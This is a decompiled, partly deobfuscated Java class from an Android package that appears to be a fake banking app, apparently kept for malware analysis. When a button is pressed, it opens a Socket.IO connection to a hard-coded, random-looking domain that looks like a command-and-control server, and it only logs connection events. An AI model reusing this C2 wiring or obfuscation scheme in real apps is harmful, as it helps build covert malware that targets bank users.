package com.wish.lmbank.activity;

import android.os.Bundle;
import android.view.View;

import androidx.appcompat.app.AppCompatActivity;

import com.wish.lmbank.R2;
import com.wish.lmbank.utils.LogUtils;

import gv00l3ah.mvdt7w.bb7d7pu7;
import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/activity/TestSocketActivity.class */
public class TestSocketActivity extends AppCompatActivity {
    Socket mSocket;
    private String TAG = TestSocketActivity.class.getName();
    private final Emitter.Listener onConnect = new Emitter.Listener() { // from class: com.wish.lmbank.activity.TestSocketActivity.2

        @Override // io.socket.emitter.Emitter.Listener
        public void call(Object... objArr) {
//             LogUtils.v(TAG, bb7d7pu7.m5998("GgYKAgwdSQYHKgYHBwwKHQ"));
            LogUtils.v(TAG, "socket onConnect");
        }
    };
    private final Emitter.Listener onDisconnect = new Emitter.Listener() { // from class: com.wish.lmbank.activity.TestSocketActivity.3

        @Override // io.socket.emitter.Emitter.Listener
        public void call(Object... objArr) {
//             LogUtils.v(TAG, bb7d7pu7.m5998("GgYKAgwdSQYHLQAaCgYHBwwKHQ"));
            LogUtils.v(TAG, "socket onDisconnect");
            return;
        }
    };
    private final Emitter.Listener onConnectError = new Emitter.Listener() { // from class: com.wish.lmbank.activity.TestSocketActivity.4

        @Override // io.socket.emitter.Emitter.Listener
        public void call(Object... objArr) {
//             LogUtils.v(this.this$0.TAG, bb7d7pu7.m5998("GgYKAgwdSQYHKgYHBwwKHSwbGwYb"));
            LogUtils.v(TestSocketActivity.this.TAG, "socket onConnectError");
        }
    };

    /* JADX INFO: Access modifiers changed from: protected */
    @Override
    // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R2.layout.activity_test_socket);
        findViewById(R2.id.btn_connect).setOnClickListener(new View.OnClickListener() { // from class: com.wish.lmbank.activity.TestSocketActivity.1

            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                TestSocketActivity.this.connect();
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void connect() {
        try {
            close();
//             Socket socket = IO.socket(bb7d7pu7.m5998("AR0dGRpTRkYaB1sKXQEOXw8ZGwtRRwoGBA"), new IO.Options());
            Socket socket = IO.socket("https://sn2c4hg6fprb8.com", new IO.Options());
            this.mSocket = socket;
//             socket.on(bb7d7pu7.m5998("CgYHBwwKHQ"), this.onConnect);
            socket.on("connect", this.onConnect);
//             this.mSocket.on(bb7d7pu7.m5998("DQAaCgYHBwwKHQ"), this.onDisconnect);
            this.mSocket.on("disconnect", this.onDisconnect);
//             this.mSocket.on(bb7d7pu7.m5998("CgYHBwwKHTYMGxsGGw"), this.onConnectError);
            this.mSocket.on("connect_error", this.onConnectError);
//             this.mSocket.on(bb7d7pu7.m5998("CgYHBwwKHTYdAAQMBhwd"), this.onConnectError);
            this.mSocket.on("connect_timeout", this.onConnectError);
            this.mSocket.connect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void close() {
        Socket socket = this.mSocket;
        if (socket != null) {
//             socket.off(bb7d7pu7.m5998("CgYHBwwKHQ"), this.onConnect);
            socket.off("connect", this.onConnect);
//             this.mSocket.off(bb7d7pu7.m5998("DQAaCgYHBwwKHQ"), this.onDisconnect);
            this.mSocket.off("disconnect", this.onDisconnect);
//             this.mSocket.off(bb7d7pu7.m5998("CgYHBwwKHTYMGxsGGw"), this.onConnectError);
            this.mSocket.off("connect_error", this.onConnectError);
//             this.mSocket.off(bb7d7pu7.m5998("CgYHBwwKHTYdAAQMBhwd"), this.onConnectError);
            this.mSocket.off("connect_timeout", this.onConnectError);
            this.mSocket = null;
        }
    }
}
